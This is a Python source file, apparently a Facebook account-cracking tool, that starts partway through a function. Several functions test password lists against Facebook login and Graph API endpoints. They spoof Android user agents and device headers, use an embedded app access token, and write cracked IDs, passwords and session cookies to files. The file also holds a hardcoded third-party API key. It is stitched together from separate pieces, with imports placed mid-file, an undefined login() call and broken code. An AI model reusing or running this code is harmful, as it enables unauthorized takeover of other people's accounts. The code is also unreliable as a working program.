			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)

			if "checkpoint" in po.cookies.get_dict().keys():

				print(f'[HAKKU-CP]: {kk}{idf}{P} │ {kk}{pw} {P}\n')

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print(f'[HAKKU-OK]: {hh}{idf}{P} │ {hh}{pw} {P}\n [❤️]Cookie : {hh}{kuki}{P}\n')

				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

				break

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(3)

	loop+=1

#--------------------[ METODE-B-API USE THIS METHOD FOR OK ID]-----------------#

def crackfree(idf,pwv):

	global loop,ok,cp

	bi = random.choice(['\33[m'])

	pers = loop*100/len(id2)

	fff = '%'

	prog.update(des,description=f'\r[deep_white] [HAKKU_P.FB] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')

	prog.advance(des)

	ses = requests.Session()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	for pw in pwv:

		try:

			ses.headers.update({'Host': 'p.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}

			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)

			if "checkpoint" in po.cookies.get_dict().keys():

				print(f'[HAKKU-CP]: {kk}{idf}{P} │ {kk}{pw} {P}')

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print(f'[HAKKU-OK]: {hh}{idf}{P} │ {hh}{pw} {P}')

				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

				break

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(3)

	loop+=1

	

###----------[ METODE GRAPH ]---------- ###

def Api(idf,pwv):

	global loop,ok,cp

	war = str(random.choice([H2,K2,J2,B2,N2,O2,A2]))

	prog.update(des,description=f"{H2}[HAKKU-JOD] {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {war}{str(loop)}/{len(id2)}")

	prog.advance(des)

	KontolXD = ua_krek()

	ses = requests.Session()

	for pw in pwv:

		try:

			ykh = random.randint(2e7, 3e7)

			iyh = random.randint(2e4, 4e4)

			params = {

					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",

					"sdk_version": {random.randint(1,26)}, 

					"email": idf,

					"locale": "en_US",

					"password": pw,

					"sdk": "android",

					"generate_session_cookies": "1",

					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"

				}

			headers = {

					"Host": "graph.facebook.com",

					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),

					"x-fb-sim-hni": str(random.randint(20000, 40000)),

					"x-fb-net-hni": str(random.randint(20000, 40000)),

					"x-fb-connection-quality": "EXCELLENT",

					"user-agent": KontolXD,

					"content-type": "application/x-www-form-urlencoded",

					"x-fb-http-engine": "Liger"

				}

			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False)

			anjg = json.loads(xnxx.text)

			if "session_key" in xnxx.text:

				ok+=1

				print('\r\r\033[1;32m [SUCCESSFULL] '+idf+' | '+pw+'\033[1;97m')

				open('OK/'+okc,'a').write("%s|%s|%s\n"%(idf,pw,kuki))

				ok.append(idf)

				break

			elif "checkpoint" in xnxx.text:

				cp+=1

				print('\r\r\x1b[38;5;208m [CHECKPOINT] '+idf+' | '+pw+'\033[1;97m')

				open('CP/'+cpc,'a').write("%s|%s\n"%(idf,pw))

				cp.append(idf)

				break				

			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:

			    prog.update(des,description=f"{M2}craking {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {str(loop)}/{len(id2)}")

			    prog.advance(des)

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

###----------[ METODE APIV2 ]---------- ###

def apikuv2(idf,pwv):

	global loop,ok,cp

	war = str(random.choice([H2,K2,J2,B2,N2,O2,A2]))

	prog.update(des,description=f"{H2}[HAKKU-JOD]{P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {war}{str(loop)}/{len(id2)}")

	prog.advance(des)

	KontolXD = random.choice(ugen)

	ses = requests.Session()

	for pw in pwv:

		try:

			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))

			application_version_code=str(random.randint(000000000,999999999))

			fbs=random.choice(fbks)

			gtt=random.choice(xxxxx)

			gttt=random.choice(xxxxx)

			android_version=str(random.randrange(6,13))

			ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'

			ykh = random.randint(2e7, 3e7)

			iyh = random.randint(2e4, 4e4)

			params = {

					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",

					"sdk_version": {random.randint(1,26)}, 

					"email": idf,

					"locale": "en_US",

					"password": pw,

					"sdk": "android",

					"generate_session_cookies": "1",

					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"

				}

			headers = {

					"Host": "graph.facebook.com",

					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),

					"x-fb-sim-hni": str(random.randint(20000, 40000)),

					"x-fb-net-hni": str(random.randint(20000, 40000)),

					"x-fb-connection-quality": "EXCELLENT",

					"user-agent": KontolXD,

					"content-type": "application/x-www-form-urlencoded",

					"x-fb-http-engine": "Liger"

				}

			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False)

			anjg = json.loads(xnxx.text)

			if "session_key" in xnxx.text:

				ok+=1

				print('\r\r\033[1;32m [SUCCESSFULL] '+idf+' | '+pw+'\033[1;97m')

				open('OK/'+okc,'a').write("%s|%s|%s\n"%(idf,pw,kuki))

				ok.append(idf)

				break

			elif "checkpoint" in xnxx.text:

				cp+=1

				print('\r\r\x1b[38;5;208m [CHECKPOINT] '+idf+' | '+pw+'\033[1;97m')

				open('CP/'+cpc,'a').write("%s|%s\n"%(idf,pw))

				cp.append(idf)

				break				

			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:

			    prog.update(des,description=f"{M2}craking {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {str(loop)}/{len(id2)}")

			    prog.advance(des)

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64

import hmac, hashlib, urllib, stdiomask, urllib.request, uuid

from concurrent.futures import ThreadPoolExecutor

from bs4 import BeautifulSoup as parser

from threading import (Thread, Event)

from time import sleep as jeda

from datetime import datetime

ct = datetime.now()

n = ct.month

bulan_ = ['JAN', 'FEB', 'MAR', 'APR', 'MAY', 'JUN', 'JUL', 'AUG', 'SEP', 'OCT', 'NOV', 'DEC']

try:

	if n < 0 or n > 12:

		exit()

	nTemp = n - 1

except ValueError:

	exit()

current = datetime.now()

hari = current.day

bulan = bulan_[nTemp]

tahun = current.year

bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))

bulan12 = {"01": "JAN", "02": "FEB", "03": "MAR", "04": "APR", "05": "MAY", "06": "JUN", "07": "JUL", "08": "AUG", "09": "SEP", "10": "OCT", "11": "NOV", "12": "DEC"}

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

P = '\x1b[1;97m' # PUTIH

J = '\033[38;2;255;127;0;1m' # ORANGE

N = '\x1b[0m' # WARNA MATI

acak = [M, H, K, B, U, O, P, J]

warna = random.choice(acak)

til ="\033[0m╰─ "

def jalan(keliling):

	for mau in keliling + '\n':

		sys.stdout.write(mau)

		sys.stdout.flush();jeda(0.03)

		

		

ubah_pass = []

pwbaru = []

pwBaru = []

ubahP = []

def scarpping_ua():

    # Url & Headers website #

    

    

    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"

    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}

    

    # Main menu #

    

  #  os.system('clear')

    try:

        response = requests.get(url,headers=header)

        if response.status_code == 200:

            uascrap.append(response.json()['ua'])

        else:

            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")

    except requests.exceptions.ConnectionError:

        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")

        

###----------[ AUTHOR ]---------- ###

Author = 'Dapunta Khurayra X'

Version = 0.1

Facebook = 'Facebook.com/Dapunta.Khurayra.X'

Instagram = 'Instagram.com/ratya.anonym.id'

# --> Modules

import requests,bs4,sys,os,datetime,re

from bs4 import BeautifulSoup as bs

from datetime import datetime

from itertools import count 

from requests import get 

from bs4 import BeautifulSoup 

from rich import print as cetak

from rich import print as prints

from rich.panel import Panel as nel

done = False 

results = [] 

# -->  Clear Terminal

def clear():

    if "linux" in sys.platform.lower():os.system("clear")

    elif "win" in sys.platform.lower():os.system("cls")

# --> Waktu

def start():

    global Mulai_Jalan

    Mulai_Jalan = datetime.now()

def akhir():

    global Akhir_Jalan, Total_Waktu

    Akhir_Jalan = datetime.now()

    Total_Waktu = Akhir_Jalan - Mulai_Jalan

    try:

        Menit = str(Total_Waktu).split(':')[1]

        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]

        print('\nPROGRAM COMPLETED%s IN MIN %s IN SEC\n'%(Menit,Detik))

    except Exception as e:

        print('\n\nERROR\n')

# --> Main Program

class get_data_web:

    

    def __init__(self):

        self.xyz = requests.Session()

        url = input('INPUT URL: ')

        print('\n[1] Source Payload')

        print('[2] Parsed Payload')

        print('[3] Source Code Post Requests')

        self.tanya = input('INPUT : ')

        self.domain = url.split('/')[2]

        self.get_form(url)

    def get_form(self,url):

        req = self.xyz.get(url)

        raq = bs(req.content,'html.parser')

        for x in raq.find_all('form'):

            if self.tanya in ['1','01','a']: self.printing1(req,x)

            elif self.tanya in ['2','02','b']: self.printing2(req,x)

            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)

            else: exit('\nIsi  Yg Benar!')

    def get_head1(self,req):

        data = {}

        head = req.headers

        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']

        for x,y in zip(head.keys(),head.values()):

            try:

                if x.lower() in usls: continue

                else: data.update({x:y})

            except Exception as e:continue

        return(data)

    def get_data1(self,form):

        data = {}

        for y in form.find_all('input'):

            try:data.update({y['name']:y['value']})

            except Exception as e:continue

        return(data)

    def get_data2(self,form):

        data = []

        for y in form.find_all('input'):

            try:data.append(y)

            except Exception as e:continue

        return(data)

    def get_post1(self,form):

        z = form['action']

        if 'https://'+self.domain in z: return(z)

        elif 'http://'+self.domain in z: return(z)

        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):

        head = self.get_head1(req)

        data = self.get_data1(x)

        post = self.get_post1(x)

        coki = self.xyz.cookies.get_dict()

        print('\n\n[SOURCE PAYLOAD]\n')

        print('[Host] %s'%(self.domain))

        print('[Head] %s'%(head))

        print('[Data] %s'%(data))

        print('[COKIE] %s'%(coki))

        print('[Post] %s'%(post))

    def printing2(self,req,x):

        head = self.get_head1(req)

        data = self.get_data2(x)

        post = self.get_post1(x)

        coki = self.xyz.cookies.get_dict()

        print('\n\n[PARSED PAYLOAD]\n')

        # --> Tampil Headers

        print('head = {')

        for x,y in zip(head.keys(),head.values()):

            print('    %s%s: %s'%(x,' '*(29-len(x)),y))

        print('    }')

        # --> Tampil Data

        print('data = {')

        for x in data:

            try:

                if 'value' in str(x):

                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)

                    fp = re.search('value="(.*?)"',str(dp)).group(1)

                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))

                elif 'name' in str(x):

                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))

                else: continue

            except Exception as e: continue

        print('    }')

        # --> Tampil Cookie

        print('cookie = {')

        for x,y in zip(coki.keys(),coki.values()):

            print('    %s%s: %s'%(x,' '*(5-len(x)),y))

        print('    }')

        # --> Post Requests

        print("next = '%s'"%(post))

        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

    def printing3(self,url,req,x):

        head = self.get_head1(req)

        data = self.get_data2(x)

        post = self.get_post1(x)

        print('\n\n[SOURCE CODE POST REQUESTS]\n')

        # --> Tampil Get Requests

        print("url  = '%s'"%(url))

        print("requ = bs(requests.Session().get(url).content,'html.parser')")

        # --> Tampil Headers

        print('head = {')

        for x,y in zip(head.keys(),head.values()):

            print('    %s%s: %s'%(x,' '*(29-len(x)),y))

        print('    }')

        # --> Tampil Data

        print('data = {')

        for x in data:

            try:

                if 'value' in str(x):

                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)

                    fp = re.search('value="(.*?)"',str(dp)).group(1)

                    gp = dp.replace(fp,'(.*?)')

                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))

                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))

                elif 'name' in str(x):

                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))

                else: continue

            except Exception as e: continue

        print('    }')

        # --> Tampil Cookie

        print("cookie = requests.Session().cookies.get_dict()")

        # --> Post Requests

        print("next = '%s'"%(post))

        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

if __name__=='__main__':

	try:os.system('git pull')

	except:pass

	try:os.mkdir('OK')

	except:pass

	try:os.mkdir('CP')

	except:pass

	try:os.system('touch .hakku.txt')

	except:pass

	login()
